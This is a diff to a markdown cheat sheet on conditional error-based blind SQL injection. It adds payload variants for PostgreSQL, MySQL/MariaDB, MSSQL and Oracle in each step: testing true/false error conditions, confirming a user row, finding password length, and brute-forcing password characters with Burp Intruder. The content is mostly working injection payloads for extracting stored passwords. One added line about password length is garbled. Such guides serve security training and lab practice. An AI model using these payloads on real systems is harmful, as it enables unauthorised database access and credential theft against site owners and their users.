@@ -19,41 +19,68 @@ you need to have a basic idea of what the original query is.
 ### 2. Testing Error Entries
 
 ```sql
+-- PostgreSQL
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--
+' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)--
+
+-- MySQL / MariaDB
+' AND (SELECT IF(1=1,1/0,1))#
+' AND (SELECT IF(1=2,1/0,1))#
+
+-- Microsoft SQL Server (MSSQL)
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--
+' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)--
+
+-- Oracle (all versions)
 ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)--
-/*
-the above payload will always result in error cuz 1=1 and 1 divide by 0 result is undefined.
-*/
-
-' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)='a'-- 
-/*
-the above payload will not result in error cuz 1=2 is false and else part will get executed.
-*/
+' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)--
 
 /*
-NOTE: this is for oracle databases so check the Cheatsheet of SQli to give database specific string concatenation and syntaxes.
+test both 1=1 and 1=2 conditions of the payload
+these payloads are designed in true/false conditions
+one will produce error and the other no error indicating conditonal error based sqli.
+check the PortSwigger CHEATSHEET for database specific payloads.
 */
 ```
 
 ### 3. Checking User Entry
 
 ```sql
-' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>')='a'--
+-- PostgreSQL, Microsoft SQL Server (MSSQL)
+' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>')='a'--
+
+-- MySQL / MariaDB
+' AND (SELECT IF(1=2,1/0,'a') FROM <table_name> WHERE <username_column>='<username>')='a'#
+
+-- Oracle
+' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>' AND ROWNUM=1)='a'--
 
 /*
-NOTE: For database specific string concatenation and syntaxes checkout the Cheatsheet of the SQli.
+check the PortSwigger CHEATSHEET for database specific payloads.
 */
 ```
 
 ### 4. Finding Password Length
 
-- Increment the  `<value>` by `1` each time until you hit an error. So if at `19` you get error so the password length is 19.
-- If `LENGTH(<password_column>) > <value>` is **true** then password length = current `<value>`. Check the last request.
-- If `LENGTH(<password_column>) > <value>` is **false** then increment `<value>` by 1.
+- If `LENGTH(<password_column>) > <value>` is **true** → you get an **error**
+- If `LENGTH(<password_column>) > <value>` is **false** → it returns `'a'` (no error)
+- The first no error request in the length of the password.
 
-**TIP: Send this request to BurpSuite Intruder and then add payload in the `<value>` part and set Payload Type to Numbers and provide a starting and ending range. Then start the attack. Look for the last error request. The last error request will have the length of the password. So if the last request is `19` so password length = `19 + 1 = 20`.**
+**TIP: Send this request to BurpSuite Intruder and then add payload in the `<value>` part and set Payload Type to Numbers and provide a starting and ending range. Then start the attack.**
 
 ```sql
-' AND (SELECT CASE WHEN LENGTH(<password_column>) > <value> THEN to_char(1/0) ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>')='a'--
+-- PostgreSQL, Microsoft SQL Server (MSSQL)
+' AND (SELECT CASE WHEN LENGTH(<password_column>)><value> THEN 1/0 ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>')='a'--
+
+-- MySQL / MariaDB
+' AND (SELECT IF(LENGTH(<password_column>)><value>,1/0,'a') FROM <table_name> WHERE <username_column>='<username>')='a'#
+
+-- Oracle
+' AND (SELECT CASE WHEN LENGTH(<password_column>)><value> THEN TO_CHAR(1/0) ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>' AND ROWNUM=1)='a'--
+
+/*
+check the PortSwigger CHEATSHEET for database specific payloads.
+*/
 ```
 
 ### 5. Bruteforcing Password
@@ -79,7 +106,18 @@ NOTE: For database specific string concatenation and syntaxes checkout the Cheat
 	- If error is produced then **true** else **false**. It means if error then character matches index character value. Use the BurpSuite to look for these error requests.
 
 ```sql
-' AND (SELECT CASE WHEN SUBSTR(<password_column>,§1§,1)='§2§' THEN to_char(1/0) ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>')='a'--
+-- PostgreSQL, Microsoft SQL Server (MSSQL)
+' AND (SELECT CASE WHEN SUBSTRING(<password_column>,§1§,1)='§2§' THEN 1/0 ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>')='a'--
+
+-- MySQL / MariaDB
+' AND (SELECT IF(SUBSTRING(<password_column>,§1§,1)='§2§',1/0,'a') FROM <table_name> WHERE <username_column>='<username>')='a'#
+
+-- Oracle (all versions)
+' AND (SELECT CASE WHEN SUBSTR(<password_column>,§1§,1)='§2§' THEN TO_CHAR(1/0) ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>' AND ROWNUM=1)='a'--
+
+/*
+check the PortSwigger CHEATSHEET for database specific payloads.
+*/
 ```
 
 ---
